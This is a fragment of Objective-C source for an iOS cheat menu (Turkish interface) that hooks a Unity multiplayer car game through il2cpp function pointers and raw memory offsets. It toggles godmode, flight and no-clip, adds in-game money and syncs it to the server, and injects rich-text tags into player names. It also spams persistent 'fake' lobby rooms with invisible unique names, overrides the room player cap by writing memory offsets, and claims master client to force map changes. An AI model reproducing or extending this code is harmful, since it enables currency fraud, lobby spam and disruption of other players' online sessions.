- (void)tapGifColored { g_gifColored = !g_gifColored; saveBool(@"gifColored", g_gifColored); [self refreshUI]; }
- (void)pickGifSize:(UIButton*)b {
    if      (g_gifCols <= 16) g_gifCols = 24;
    else if (g_gifCols <= 24) g_gifCols = 32;
    else if (g_gifCols <= 32) g_gifCols = 40;
    else                      g_gifCols = 16;
    saveInt(@"gifCols", g_gifCols);
    NSString *snm = (g_gifCols<=16)?@"Kucuk (16)":(g_gifCols<=24)?@"Orta (24)":(g_gifCols<=32)?@"Buyuk (32)":@"Dev (40)";
    [b setTitle:[NSString stringWithFormat:@"\U0001F4D0 GIF ASCII Olcu: %@", snm] forState:UIControlStateNormal];
    FLog([NSString stringWithFormat:@"GIF olcu: %@ (yeni olcu icin GIF'i tekrar yukle)", snm]);
}

// ================= FAVORILER =================
- (NSArray*)favAllKeys {
    return @[@"godmode",@"fly",@"flyauto",@"noclip",@"drift",@"cruise",@"selektor",
             @"antigrav",@"lowgrav",@"asciianim",@"matrixchat",@"glitchchat",@"carcolor"];
}
- (NSString*)favTitleForKey:(NSString*)k {
    NSDictionary *m = @{@"godmode":@"\U0001F6E1 Godmode",@"fly":@"\U0001F6E9 Ucus",@"flyauto":@"\U0001F6E9 Oto Gaz",
      @"noclip":@"\U0001F47B No-Clip",@"drift":@"\U0001F9CA Drift",@"cruise":@"\U0001F697 Cruise",
      @"selektor":@"\U0001F4A1 Selektor",@"antigrav":@"\U0001F319 Anti-Grav",@"lowgrav":@"\U0001FAB6 Dusuk Gravite",
      @"asciianim":@"\U0001F3AC ASCII Anim",@"matrixchat":@"\U0001F7E2 Matrix Chat",@"glitchchat":@"\U0001F480 Glitch Chat",
      @"carcolor":@"\U0001F308 Arac Boya",@"popbangs":@"🔥 Pop&Bangs",@"autohorn":@"🔊 Auto Korna",@"revlimiter":@"🔥 Kesici Modu",
      @"brakeglow":@"🔥 Balata Glow",@"nodamage":@"🛡️ Hasar Yok"};
    return m[k] ?: k;
}
- (BOOL)favStateForKey:(NSString*)k {
    if ([k isEqualToString:@"godmode"])   return isGodmode;
    if ([k isEqualToString:@"fly"])       return isFlyEnabled;
    if ([k isEqualToString:@"flyauto"])   return flyAutoThrust;
    if ([k isEqualToString:@"noclip"])    return isNoClip;
    if ([k isEqualToString:@"drift"])     return isDriftEnabled;
    if ([k isEqualToString:@"cruise"])    return isCruiseEnabled;
    if ([k isEqualToString:@"selektor"])  return isSelektor;
    if ([k isEqualToString:@"antigrav"])  return isAntiGrav;
    if ([k isEqualToString:@"lowgrav"])   return isLowGravEnabled;
    if ([k isEqualToString:@"asciianim"]) return isAsciiAnimEnabled;
    if ([k isEqualToString:@"matrixchat"])return isMatrixChatEnabled;
    if ([k isEqualToString:@"glitchchat"])return isGlitchChatEnabled;
    if ([k isEqualToString:@"carcolor"])  return isCarColorEnabled;
    if ([k isEqualToString:@"popbangs"])  return isPopBangsEnabled;
    if ([k isEqualToString:@"autohorn"])  return isAutoHornEnabled;
    if ([k isEqualToString:@"revlimiter"])return isRevLimiterEnabled;
    if ([k isEqualToString:@"brakeglow"]) return isBrakeGlowEnabled;
    if ([k isEqualToString:@"nodamage"])  return isNoDamageEnabled;
    return NO;
}
- (SEL)favSelForKey:(NSString*)k {
    NSDictionary *m = @{@"godmode":@"tapGodmode",@"fly":@"tapFly",@"flyauto":@"tapFlyAuto",
      @"noclip":@"tapNoClip",@"drift":@"tapDrift",@"cruise":@"tapCruise",@"selektor":@"tapSelektor",
      @"antigrav":@"tapAntiGrav",@"lowgrav":@"tapLowGrav",@"asciianim":@"tapAsciiAnim",
      @"matrixchat":@"tapMatrixChat",@"glitchchat":@"tapGlitchChat",@"carcolor":@"tapCarColor",
      @"popbangs":@"tapPopBangs",@"autohorn":@"tapAutoHorn",@"revlimiter":@"tapRevLimiter",
      @"brakeglow":@"tapBrakeGlow",@"nodamage":@"tapNoDamage"};
    NSString *s = m[k];
    return s ? NSSelectorFromString(s) : NULL;
}
- (void)openFavorites {
    loadFavorites();
    UIWindow *w = getKeyWindow(); if (!w) return;
    if (self.favOverlay) { [self.favOverlay removeFromSuperview]; self.favOverlay = nil; }
    CGFloat W = w.bounds.size.width, H = w.bounds.size.height;
    CGFloat ow = MIN(360.0, W-20), oh = MIN(470.0, H-20);
    UIView *ov = [[UIView alloc] initWithFrame:CGRectMake((W-ow)/2,(H-oh)/2,ow,oh)];
    ov.backgroundColor = [UIColor colorWithRed:0.97 green:0.99 blue:1.0 alpha:0.99];
    ov.layer.cornerRadius = 16; ov.layer.borderWidth = 1.5; ov.layer.borderColor = C_GOLD.CGColor;
    self.favOverlay = ov;
    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(14,10,ow-100,24)];
    tl.text = @"⭐ Favoriler"; tl.textColor = C_TEXT; tl.font = [UIFont boldSystemFontOfSize:15];
    [ov addSubview:tl];
    UIButton *ed = [UIButton buttonWithType:UIButtonTypeSystem];
    ed.frame = CGRectMake(ow-84,8,40,32); [ed setTitle:@"➕" forState:UIControlStateNormal];
    ed.titleLabel.font = [UIFont systemFontOfSize:18];
    [ed addTarget:self action:@selector(editFavorites) forControlEvents:UIControlEventTouchUpInside];
    [ov addSubview:ed];
    UIButton *x = [UIButton buttonWithType:UIButtonTypeSystem];
    x.frame = CGRectMake(ow-42,8,32,32); [x setTitle:@"✕" forState:UIControlStateNormal];
    [x setTitleColor:C_TEXT forState:UIControlStateNormal]; x.titleLabel.font = [UIFont systemFontOfSize:18];
    [x addTarget:self action:@selector(closeFavorites) forControlEvents:UIControlEventTouchUpInside];
    [ov addSubview:x];
    UIScrollView *sc = [[UIScrollView alloc] initWithFrame:CGRectMake(8,44,ow-16,oh-52)];
    [ov addSubview:sc];
    CGFloat yy = 0;
    if (g_favorites.count == 0) {
        UILabel *hint = [[UILabel alloc] initWithFrame:CGRectMake(6,8,ow-28,70)];
        hint.numberOfLines = 4;
        hint.text = @"Henuz favori yok.\n➕ ile istedigin ozellikleri ekle — buradan tek dokunusla ac/kapat.";
        hint.textColor = C_SUB; hint.font = [UIFont systemFontOfSize:12];
        [sc addSubview:hint]; yy += 80;
    }
    for (NSString *key in g_favorites) {
        BOOL on = [self favStateForKey:key];
        UIView *row = [[UIView alloc] initWithFrame:CGRectMake(0,yy,ow-16,48)];
        row.layer.cornerRadius = 10;
        row.backgroundColor = on ? [UIColor colorWithRed:0.85 green:0.95 blue:1.0 alpha:1.0]
                                 : [UIColor colorWithRed:0.93 green:0.95 blue:0.97 alpha:1.0];
        row.layer.borderWidth = 1.0; row.layer.borderColor = (on?C_ON:C_OFF).CGColor;
        UILabel *lb = [[UILabel alloc] initWithFrame:CGRectMake(12,0,ow-16-24,48)];
        lb.text = [NSString stringWithFormat:@"%@    %@", [self favTitleForKey:key], on?@"ACIK ✅":@"KAPALI"];
        lb.textColor = on ? C_ON : C_SUB; lb.font = [UIFont systemFontOfSize:14 weight:UIFontWeightBold];
        [row addSubview:lb];
        UIButton *tap = [UIButton buttonWithType:UIButtonTypeCustom];
        tap.frame = row.bounds;
        objc_setAssociatedObject(tap, "favkey", key, OBJC_ASSOCIATION_RETAIN);
        [tap addTarget:self action:@selector(favToggle:) forControlEvents:UIControlEventTouchUpInside];
        [row addSubview:tap];
        [sc addSubview:row]; yy += 54;
    }
    sc.contentSize = CGSizeMake(ow-16, yy);
    [w addSubview:ov];
}
- (void)closeFavorites { if (self.favOverlay) { [self.favOverlay removeFromSuperview]; self.favOverlay = nil; } }
- (void)favToggle:(UIButton*)b {
    NSString *key = objc_getAssociatedObject(b, "favkey");
    if (!key) return;
    SEL sel = [self favSelForKey:key];
    if (sel && [self respondsToSelector:sel]) {
        #pragma clang diagnostic push
        #pragma clang diagnostic ignored "-Warc-performSelector-leaks"
        [self performSelector:sel];
        #pragma clang diagnostic pop
    }
    [self openFavorites];   // paneli yenile -> durum guncellensin
}
- (void)editFavorites {
    loadFavorites();
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⭐ Favori Ekle / Cikar" message:@"Dokun: favorilere ekle / cikar" preferredStyle:UIAlertControllerStyleActionSheet];
    for (NSString *key in [self favAllKeys]) {
        BOOL isFav = [g_favorites containsObject:key];
        NSString *t = [NSString stringWithFormat:@"%@ %@", isFav?@"⭐":@"☆", [self favTitleForKey:key]];
        [ac addAction:[UIAlertAction actionWithTitle:t style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
            if ([g_favorites containsObject:key]) [g_favorites removeObject:key];
            else [g_favorites addObject:key];
            saveFavorites();
            [self openFavorites];
        }]];
    }
    [ac addAction:[UIAlertAction actionWithTitle:@"Kapat" style:UIAlertActionStyleCancel handler:nil]];
    if (ac.popoverPresentationController) {
        ac.popoverPresentationController.sourceView = self.panel;
        ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
    }
    [self present:ac];
}

- (void)addMoneyTap {
    if (playerManagerGetInst && pm_addMoney) {
        @try {
            void* pm = playerManagerGetInst();
            if (pm) {
                pm_addMoney(pm, customMoneyAmount);
                if (pm_syncWithServer) { @try { pm_syncWithServer(pm); } @catch (...) {} }
                [self.moneyBtn setTitle:[NSString stringWithFormat:@"\U0001F4B5 %@ Eklendi ✅", [self shortNum:customMoneyAmount]] forState:UIControlStateNormal];
                [self.moneyBtn setTitleColor:C_ON forState:UIControlStateNormal];
            } else {
                [self.moneyBtn setTitle:@"\U0001F4B5 Oyuna gir!" forState:UIControlStateNormal];
                [self.moneyBtn setTitleColor:C_RED forState:UIControlStateNormal];
            }
        } @catch (...) {}
    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{ [self refreshUI]; });
}

- (void)changeName {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F4DB Isim Degistir" message:@"Yeni ismin:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.placeholder = @"FEW1N"; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Degistir" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *name = ac.textFields.firstObject.text;
        if (name.length > 0 && pn_setNickName) {
            void* ns = mkStr(name);
            if (ns) {
                pn_setNickName(ns);
                if (playerManagerGetInst && pm_updateNicknameInternal) {
                    @try { void* pm = playerManagerGetInst(); if (pm) pm_updateNicknameInternal(pm, ns); } @catch (...) {}
                }
                [self.nameBtn setTitle:[NSString stringWithFormat:@"\U0001F4DB Isim: %@ ✅", name] forState:UIControlStateNormal];
                [self.nameBtn setTitleColor:C_ON forState:UIControlStateNormal];
            }
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// Her harfe rainbow renk verir (Unity TMP rich text acigi)
- (void)rainbowName {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F308 Rainbow Isim"
                                                               message:@"Isim yaz - her harf rainbow olur:" preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){ tf.text = @"FEW1N"; tf.clearButtonMode = UITextFieldViewModeAlways; }];
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *src = ac.textFields.firstObject.text;
        if (src.length == 0 || !pn_setNickName) return;
        NSArray *cols = @[@"#FF0000",@"#FF7F00",@"#FFFF00",@"#00FF00",@"#00FFFF",@"#4466FF",@"#FF00FF"];
        NSMutableString *rich = [NSMutableString string];
        for (NSUInteger i = 0; i < src.length; i++) {
            NSString *ch = [src substringWithRange:NSMakeRange(i,1)];
            [rich appendFormat:@"<color=%@><b>%@</b></color>", cols[i % cols.count], ch];
        }
        void* ns = mkStr(rich);
        if (ns) {
            pn_setNickName(ns);
            if (playerManagerGetInst && pm_updateNicknameInternal) {
                @try { void* pm = playerManagerGetInst(); if (pm) pm_updateNicknameInternal(pm, ns); } @catch (...) {}
            }
            [self.nameBtn setTitle:@"\U0001F308 Rainbow isim aktif ✅" forState:UIControlStateNormal];
            [self.nameBtn setTitleColor:C_ON forState:UIControlStateNormal];
        }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== FAKE ODA SPAM =====
- (void)createOneRoom {
    @try {
        // Zaten bir odadaysak once odadan temiz ayril ki lobi senkronizasyonu kopmasin ve kilitlenmesin
        if (pn_getInRoom && pn_getInRoom()) {
            if (pn_leaveRoom) pn_leaveRoom(false);
            if (lobbyGetInst && lobby_leaveRoom) {
                void* l = lobbyGetInst();
                if (l) lobby_leaveRoom(l);
            }
        }
        // BENZERSIZ isim: Photon oda isimleri UNIQUE olmali. Gorunmez zero-width space (​)
        // ekle -> her oda benzersiz, ekranda GORUNMEZ ve buyuk harfe cevrilse bile kalir.
        static int g_roomCounter = 0;
        g_roomCounter++;
        NSMutableString *uniqName = [NSMutableString stringWithUTF8String:customRoomName];
        int reps = (g_roomCounter % 400) + 1;
        for (int i = 0; i < reps; i++) [uniqName appendString:@"​"];
        void* nameStr = mkStr(uniqName);
        if (!nameStr) return;
        // KALICI oda: RoomOptions.EmptyRoomTtl ver -> sen cikinca oda silinmez, listede kalir
        if (pn_createRoom && i_object_new && g_roomOptionsClass) {
            void* opts = i_object_new(g_roomOptionsClass);
            if (opts) {
                *(bool*)((uintptr_t)opts + 0x10) = true;     // isVisible
                *(bool*)((uintptr_t)opts + 0x11) = true;     // isOpen
                *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers;   // MaxPlayers (10 sinirini as)
                *(int*) ((uintptr_t)opts + 0x1C) = roomSpamTTL;   // EmptyRoomTtl (ayarlanabilir)
                pn_createRoom(nameStr, opts, NULL, NULL);
                return;
            }
        }
        // yedek: oyunun kendi butonu (oda kalici olmayabilir)
        if (lobbyGetInst && lobby_createRoom) {
            void* lobby = lobbyGetInst();
            if (!lobby) return;
            if (tmp_set_text) {
                void* nameInput = *(void**)((uintptr_t)lobby + 0x48);   // roomNameInput
                if (nameInput) tmp_set_text(nameInput, nameStr);
            }
            lobby_createRoom(lobby);
        }
    } @catch (...) {}
}

// ===== GELISMIS OZEL ODA KURUCU (Harita, Gunun Saati, Mod, 31 Kisi) =====
- (void)createAdvancedCustomRoom {
    if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) {
        UIAlertController *warn = [UIAlertController alertControllerWithTitle:@"⚠️ Lobiye Girin"
            message:@"Oda kurabilmek için önce online Lobi / Oda Listesi ekranına girmeniz gerekmektedir." preferredStyle:UIAlertControllerStyleAlert];
        [warn addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:warn];
        return;
    }

    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🏡 Gelişmiş Özel Oda Kur"
        message:[NSString stringWithFormat:@"%d kişilik oda. Oda adını yazın:", roomMaxPlayers] preferredStyle:UIAlertControllerStyleAlert];

    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = [NSString stringWithUTF8String:customRoomName];
        tf.placeholder = @"Oda İsmi (Örn: FEW1N DRIFT ODA)";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];

    // 1. Aşama: Harita Seçimi
    [ac addAction:[UIAlertAction actionWithTitle:@"Devam Et ➡️ (Harita & Mod Seç)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *act){
        NSString *roomNameInput = ac.textFields.firstObject.text;
        if (!roomNameInput || roomNameInput.length == 0) roomNameInput = @"FEW1N ODA";
        NSString *roomNameCopy = [roomNameInput copy];

        UIAlertController *mapAc = [UIAlertController alertControllerWithTitle:@"🏜️ Harita Seçimi"
            message:@"Kurulacak odanın haritasını seçin:" preferredStyle:UIAlertControllerStyleAlert];

        NSArray *maps = @[
            @{@"title": @"🏜️ Çöl (Desert)", @"idx": @3, @"code": @"Desert"},
            @{@"title": @"🏙️ Şehir (City)", @"idx": @1, @"code": @"City"},
            @{@"title": @"🛣️ Otoban (Highway)", @"idx": @2, @"code": @"Highway"},
            @{@"title": @"🏎️ Yarış Pisti (Track)", @"idx": @0, @"code": @"Track"},
            @{@"title": @"⚓ Liman (Port)", @"idx": @4, @"code": @"Port"},
            @{@"title": @"⛰️ Dağ Yolu (Offroad)", @"idx": @5, @"code": @"Offroad"},
            @{@"title": @"🌲 Orman (Forest)", @"idx": @6, @"code": @"Forest"},
            @{@"title": @"🏡 Köy / Kasaba (Village)", @"idx": @7, @"code": @"Village"},
            @{@"title": @"❄️ Kar / Buz (Snow)", @"idx": @8, @"code": @"Snow"}
        ];

        for (NSDictionary *m in maps) {
            NSString *mTitle = m[@"title"];
            int mIdx = [m[@"idx"] intValue];
            NSString *mCode = m[@"code"];

            [mapAc addAction:[UIAlertAction actionWithTitle:mTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction *a2){

                // 2. Aşama: Günün Saati / Hava
                UIAlertController *timeAc = [UIAlertController alertControllerWithTitle:@"☀️ Günün Saati / Weather"
                    message:@"Zaman dilimini ve hava durumunu seçin:" preferredStyle:UIAlertControllerStyleAlert];

                NSArray *times = @[
                    @{@"title": @"☀️ Gündüz (Day)", @"mode": @"Day"},
                    @{@"title": @"🌆 Akşam / Gün Batımı (Sunset)", @"mode": @"Sunset"},
                    @{@"title": @"🌙 Gece (Night)", @"mode": @"Night"},
                    @{@"title": @"🌧️ Yağmurlu / Sisli (Rain)", @"mode": @"Rain"}
                ];

                for (NSDictionary *t in times) {
                    NSString *tTitle = t[@"title"];

                    [timeAc addAction:[UIAlertAction actionWithTitle:tTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction *a3){

                        // 3. Aşama: Oyun Modu (Drift / Serbest / Yarış / Bomba)
                        UIAlertController *modeAc = [UIAlertController alertControllerWithTitle:@"🏎️ Oyun Modu"
                            message:@"Oda oyun modunu seçin:" preferredStyle:UIAlertControllerStyleAlert];

                        NSArray *modes = @[
                            @{@"title": @"🏎️ Drift Modu", @"m": @"Drift"},
                            @{@"title": @"🚦 Serbest Sürüş (Freeroam)", @"m": @"Free"},
                            @{@"title": @"🏁 Klasik Yarış (Circuit)", @"m": @"Race"},
                            @{@"title": @"💣 Bomba Modu (Bomb Mode)", @"m": @"Bomb"}
                        ];

                        for (NSDictionary *md in modes) {
                            NSString *mdTitle = md[@"title"];

                            [modeAc addAction:[UIAlertAction actionWithTitle:mdTitle style:UIAlertActionStyleDefault handler:^(UIAlertAction *a4){

                                // ODAYI KUR!
                                @try {
                                    NSString *uniq = [roomNameCopy stringByAppendingString:@"​"];
                                    void* nameStr = mkStr(uniq);
                                    void* opts = i_object_new(g_roomOptionsClass);
                                    if (nameStr && opts) {
                                        *(bool*)((uintptr_t)opts + 0x10) = true;            // isVisible
                                        *(bool*)((uintptr_t)opts + 0x11) = true;            // isOpen
                                        *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers;  // 31 Kişi
                                        *(int*) ((uintptr_t)opts + 0x1C) = 0;

                                        bool ok = pn_createRoom(nameStr, opts, NULL, NULL);
                                        if (ok) {
                                            FLog([NSString stringWithFormat:@"✓ Özel oda kuruluyor: '%@' (%d kişi, %@, %s, %s)", roomNameCopy, roomMaxPlayers, mTitle, tTitle.UTF8String, mdTitle.UTF8String]);
                                            // Haritaya otomatik geçiş yap
                                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                                                if (pn_loadLevelInt) {
                                                    pn_loadLevelInt(mIdx);
                                                } else if (pn_loadLevelStr && mCode) {
                                                    void* s = mkStr(mCode);
                                                    if (s) pn_loadLevelStr(s);
                                                }
                                            });
                                        }
                                    }
                                } @catch (...) { FLog(@"Özel oda kurma hatası"); }

                            }]];
                        }
                        [modeAc addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
                        [self present:modeAc];

                    }]];
                }
                [timeAc addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
                [self present:timeAc];

            }]];
        }

        // Manuel Özel Harita İsmi veya İndeksi Girme Butonu
        [mapAc addAction:[UIAlertAction actionWithTitle:@"✏️ Özel Harita Adı / İndeksi Yaz" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aCustom){
            UIAlertController *custAc = [UIAlertController alertControllerWithTitle:@"✏️ Özel Harita"
                message:@"Geçmek istediğiniz harita indeksini (0-10) veya sahne kodunu yazın:" preferredStyle:UIAlertControllerStyleAlert];
            [custAc addTextFieldWithConfigurationHandler:^(UITextField *tf){
                tf.placeholder = @"Örn: 0 veya Desert veya City";
                tf.clearButtonMode = UITextFieldViewModeAlways;
            }];
            [custAc addAction:[UIAlertAction actionWithTitle:@"Kur & Geç" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aC2){
                NSString *customVal = custAc.textFields.firstObject.text;
                if (!customVal || customVal.length == 0) return;
                @try {
                    NSString *uniq = [roomNameCopy stringByAppendingString:@"​"];
                    void* nameStr = mkStr(uniq);
                    void* opts = i_object_new(g_roomOptionsClass);
                    if (nameStr && opts) {
                        *(bool*)((uintptr_t)opts + 0x10) = true;
                        *(bool*)((uintptr_t)opts + 0x11) = true;
                        *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers;
                        *(int*) ((uintptr_t)opts + 0x1C) = 0;
                        if (pn_createRoom(nameStr, opts, NULL, NULL)) {
                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                                if ([customVal rangeOfCharacterFromSet:[[NSCharacterSet decimalDigitCharacterSet] invertedSet]].location == NSNotFound) {
                                    int idx = [customVal intValue];
                                    if (pn_loadLevelInt) pn_loadLevelInt(idx);
                                } else {
                                    void* s = mkStr(customVal);
                                    if (s && pn_loadLevelStr) pn_loadLevelStr(s);
                                }
                            });
                        }
                    }
                } @catch (...) {}
            }]];
            [custAc addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
            [self present:custAc];
        }]];

        [mapAc addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:mapAc];

    }]];

    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// ===== NORMAL ODA KUR (isim yaz + yuksek kapasite, oyunun 10 sinirini as) =====
- (void)createNormalRoom {
    if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) {
        UIAlertController *warn = [UIAlertController alertControllerWithTitle:@"⚠️ Lobiye Girin"
            message:@"Oda kurabilmek için önce online Lobi / Oda Listesi ekranına girmeniz gerekmektedir." preferredStyle:UIAlertControllerStyleAlert];
        [warn addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:warn];
        return;
    }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3E0 Normal Oda Kur"
        message:[NSString stringWithFormat:@"%d kisilik oda. Oda adini yaz:", roomMaxPlayers] preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.text = [NSString stringWithUTF8String:customRoomName];
        tf.placeholder = @"Oda adi (istedigin isim)";
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];
    [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"Kur (%d kisilik)", roomMaxPlayers] style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *nm = ac.textFields.firstObject.text;
        if (!nm || nm.length == 0) nm = @"FEW1N ODA";
        strncpy(customRoomName, nm.UTF8String, sizeof(customRoomName)-1); customRoomName[sizeof(customRoomName)-1]='\0';
        // Photon oda ismi BENZERSIZ olmali -> sona 1 gorunmez karakter ekle (ekranda gorunmez)
        NSString *uniq = [nm stringByAppendingString:@"​"];
        @try {
            if (pn_getInRoom && pn_getInRoom()) {
                FLog(@"Oda tespit edildi: Yeni oda kurulmadan önce mevcut odadan ayrılınıyor...");
                if (pn_leaveRoom) pn_leaveRoom(false);
                if (lobbyGetInst && lobby_leaveRoom) {
                    void* l = lobbyGetInst();
                    if (l) lobby_leaveRoom(l);
                }
            }
            void* nameStr = mkStr(uniq);
            void* opts = i_object_new(g_roomOptionsClass);
            if (nameStr && opts) {
                *(bool*)((uintptr_t)opts + 0x10) = true;            // isVisible
                *(bool*)((uintptr_t)opts + 0x11) = true;            // isOpen
                *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers;  // 10 sinirini as
                *(int*) ((uintptr_t)opts + 0x1C) = 0;               // normal oda (spam TTL yok)
                bool ok = pn_createRoom(nameStr, opts, NULL, NULL);
                FLog(ok ? [NSString stringWithFormat:@"✓ Oda kurma istegi GONDERILDI: '%@' (%d kisilik). Birazdan odaya girmelisin.", nm, roomMaxPlayers]
                        : @"❌ CreateRoom REDDETTI. Sebep genelde: zaten odadasin YA DA oda listesi/lobi ekraninda degilsin. Ana menu > oda listesinde dene.");
            } else FLog(@"Oda kurma basarisiz (RoomOptions olusturulamadi)");
        } @catch (...) { FLog(@"Oda kurma hatasi"); }
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
// GUVENILIR YOL: normal odayi kurduktan sonra MEVCUT odanin kapasitesini buyut (Room.set_MaxPlayers)
- (void)setRoomMax {
    few1n_claimMaster();
    if (!pn_getCurrentRoom || !room_setMaxPlayers) { FLog(@"Hazir degil - il2cpp init bekle (oyuna gir)"); return; }
    @try {
        void* room = pn_getCurrentRoom();
        if (!ptrOk(room)) { FLog(@"❌ Bir odada DEGILSIN! Once normal oda kur/odaya gir, SONRA bu butona bas."); return; }
        int before = room_getMaxPlayers ? room_getMaxPlayers(room) : -1;
        room_setMaxPlayers(room, roomMaxPlayers);
        int after = room_getMaxPlayers ? room_getMaxPlayers(room) : -1;
        FLog([NSString stringWithFormat:@"✓ Oda kapasitesi: %d -> %d yapildi. (Master sensen -yani odayi sen kurduysan- gecerli olur)", before, after]);
    } @catch (...) { FLog(@"Oda kapasite hatasi"); }
}

// ===== ESKI HARITA DEGISTIRME (calismiyordu - devre disi, sadece uyari verir) =====
// MapList.Map struct (dump.cs dogrulanmis): referenceName@0x0, mode@0x8, sprite@0x10, visualName@0x18 -> stride 0x20
static NSArray<NSString*>* few1n_readMapNames(void) {
    NSMutableArray *names = [NSMutableArray array];
    @try {
        if (!mapList_getInstance) return names;
        void* ml = mapList_getInstance();
        if (!ptrOk(ml)) return names;
        void* arr = *(void**)((uintptr_t)ml + 0x18);   // MapList.maps[]
        if (!ptrOk(arr)) return names;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));   // il2cpp array length
        if (cnt <= 0 || cnt > 64) return names;
        uintptr_t data = (uintptr_t)arr + 0x20;                 // eleman verisi
        for (int i = 0; i < cnt; i++) {
            @try {
                void* refName = *(void**)(data + i * 0x20 + 0x0);   // Map.referenceName
                if (ptrOk(refName)) {
                    NSString *s = readStr(refName);
                    if (s && s.length > 0) [names addObject:s];
                }
            } @catch (...) {}
        }
    } @catch (...) {}
    return names;
}

// ===== v83: v77 CALISAN VERSIYON — master claim + photonMgrEnp + LoadLevel fallback =====
static void few1n_loadMap(NSString *scene, int idx) {
    (void)idx;
    if (!scene || scene.length == 0) { FLog(@"[MAP] scene bos"); return; }
    few1n_claimMaster();
    NSString *sceneCopy = [scene copy];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.8 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        @try {
            bool amMaster = false;
            if (pn_getLocalPlayer && ply_getIsMaster) {
                void* me = pn_getLocalPlayer();
                if (me) amMaster = ply_getIsMaster(me);
            }
            if (!amMaster) FLog(@"⚠️ Master gorunmuyorum — yine de deneniyor");
            if (photonMgrEnp) {
                void* s = mkStr(sceneCopy);
                if (s) {
                    photonMgrEnp(s, false);
                    FLog([NSString stringWithFormat:@"🗺️ [v233] PhotonManager.enp('%@') gonderildi", sceneCopy]);
                }
            } else {
                FLog(@"❌ photonMgrEnp NULL — offset yenilenmeli"); return;
            }
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                NSString *cur = (pn_getActiveSceneName) ? readStr(pn_getActiveSceneName()) : @"?";
                if (cur && [cur.lowercaseString containsString:sceneCopy.lowercaseString]) {
                    FLog(@"✅ [v233] Sahne degisti — basarili"); return;
                }
                FLog([NSString stringWithFormat:@"⚠️ Sahne hala '%@' — LoadLevel fallback", cur]);
                if (pn_loadLevelStr) {
                    void* s2 = mkStr(sceneCopy);
                    if (s2) { pn_loadLevelStr(s2); FLog(@"🔁 [v233] LoadLevel(str) fallback tetiklendi"); }
                }
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    NSString *c2 = (pn_getActiveSceneName) ? readStr(pn_getActiveSceneName()) : @"?";
                    if (c2 && [c2.lowercaseString containsString:sceneCopy.lowercaseString]) FLog(@"✅ [v233] Sahne degisti (LoadLevel)");
                    else FLog(@"❌ Sahne degismedi — 'Oda Master Ol' bas, tekrar dene.");
                });
            });
        } @catch (...) { FLog(@"few1n_loadMap exception"); }
    });
}

// ===== v78: KISI ARACI KLONLA (car swap glitch) =====
